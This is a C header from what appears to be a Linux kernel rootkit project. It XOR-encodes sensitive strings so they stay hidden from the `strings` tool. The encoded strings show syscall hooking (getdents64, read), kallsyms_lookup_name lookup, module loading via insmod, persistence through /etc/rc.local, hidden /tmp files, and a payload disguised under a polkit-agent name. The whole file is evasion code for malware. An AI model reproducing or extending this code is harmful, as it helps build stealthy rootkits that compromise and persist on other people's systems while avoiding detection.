#ifndef OBFS_H
#define OBFS_H

/*
 * Obfuscation des chaînes sensibles par XOR compile-time.
 *
 * Les strings sont stockées XOR'd dans .rodata → `strings` ne montre rien.
 * Elles sont décodées sur la stack au moment de l'appel via DEOBFS().
 *
 * Clé : 0x5A  (changer ici + regénérer les tableaux si besoin)
 *
 * Génération des tableaux (python3) :
 *   key = 0x5A
 *   s = "/tmp/.rk_cmd"
 *   print(', '.join(hex(ord(c) ^ key) for c in s))
 */

#define OBFS_KEY 0x5A

/* Decode enc[] (XOR'd with OBFS_KEY) into dst, null-terminate. */
void obfs_decode(char *dst, const unsigned char *enc, int len);

/*
 * DEOBFS(var, enc, len)
 *   Declare var[len+1] on the stack, call obfs_decode() to fill it.
 *   len must be a compile-time constant.
 */
#define DEOBFS(var, enc, len)      \
    char var[(len) + 1];           \
    obfs_decode(var, enc, len)

/* Encoding strings */

/* "/tmp/.rk_cmd"  len=12 */
#define _LEN_RK_CMD   12
static const unsigned char _enc_rk_cmd[_LEN_RK_CMD] = {
    0x75, 0x2E, 0x37, 0x2A, 0x75, 0x74, 0x28, 0x31, 0x05, 0x39, 0x37, 0x3E
};

/* "/proc/modules"  len=13 */
#define _LEN_PROC_MOD   13
static const unsigned char _enc_proc_mod[_LEN_PROC_MOD] = {
    0x75, 0x2A, 0x28, 0x35, 0x39, 0x75, 0x37, 0x35, 0x3E, 0x2F, 0x36, 0x3F, 0x29
};

/* "/etc/rc.local"  len=13 */
#define _LEN_ETC_RC   13
static const unsigned char _enc_etc_rc[_LEN_ETC_RC] = {
    0x75, 0x3F, 0x2E, 0x39, 0x75, 0x28, 0x39, 0x74, 0x36, 0x35, 0x39, 0x3B, 0x36
};

/* "insmod"  len=6 */
#define _LEN_INSMOD   6
static const unsigned char _enc_insmod[_LEN_INSMOD] = {
    0x33, 0x34, 0x29, 0x37, 0x35, 0x3E
};

/* "rootkit"  len=7 */
#define _LEN_ROOTKIT   7
static const unsigned char _enc_rootkit[_LEN_ROOTKIT] = {
    0x28, 0x35, 0x35, 0x2E, 0x31, 0x33, 0x2E
};

/* "kallsyms_lookup_name"  len=20 */
#define _LEN_KALLSYMS   20
static const unsigned char _enc_kallsyms[_LEN_KALLSYMS] = {
    0x31, 0x3B, 0x36, 0x36, 0x29, 0x23, 0x37, 0x29, 0x05,
    0x36, 0x35, 0x35, 0x31, 0x2F, 0x2A, 0x05, 0x34, 0x3B, 0x37, 0x3F
};

/* "__x64_sys_getdents64"  len=20 */
#define _LEN_GETDENTS   20
static const unsigned char _enc_getdents[_LEN_GETDENTS] = {
    0x05, 0x05, 0x22, 0x6C, 0x6E, 0x05, 0x29, 0x23, 0x29, 0x05,
    0x3D, 0x3F, 0x2E, 0x3E, 0x3F, 0x34, 0x2E, 0x29, 0x6C, 0x6E
};

/* "__x64_sys_read"  len=14 */
#define _LEN_SYS_READ   14
static const unsigned char _enc_sys_read[_LEN_SYS_READ] = {
    0x05, 0x05, 0x22, 0x6C, 0x6E, 0x05, 0x29, 0x23, 0x29, 0x05,
    0x28, 0x3F, 0x3B, 0x3E
};

/* "/dev/rootkit"  len=12 */
#define _LEN_DEV_RK   12
static const unsigned char _enc_dev_rk[_LEN_DEV_RK] = {
    0x75, 0x3E, 0x3F, 0x2C, 0x75, 0x28, 0x35, 0x35, 0x2E, 0x31, 0x33, 0x2E
};

/* "I am Gr00t"  len=10 */
#define _LEN_GROOT   10
static const unsigned char _enc_groot[_LEN_GROOT] = {
    0x13, 0x7A, 0x3B, 0x37, 0x7A, 0x1D, 0x28, 0x6A, 0x6A, 0x2E
};

/* "/tmp/.rk.ko"  len=11 */
#define _LEN_TMP_KO  11
static const unsigned char _enc_tmp_ko[_LEN_TMP_KO] = {
    0x75, 0x2E, 0x37, 0x2A, 0x75, 0x74, 0x28, 0x31, 0x74, 0x31, 0x35
};

/* "/tmp/.polkit-agent"  len=18 */
#define _LEN_COMP_PATH  18
static const unsigned char _enc_comp_path[_LEN_COMP_PATH] = {
    0x75, 0x2E, 0x37, 0x2A, 0x75, 0x74, 0x2A, 0x35, 0x36, 0x31,
    0x33, 0x2E, 0x77, 0x3B, 0x3D, 0x3F, 0x34, 0x2E
};

#endif /* OBFS_H */
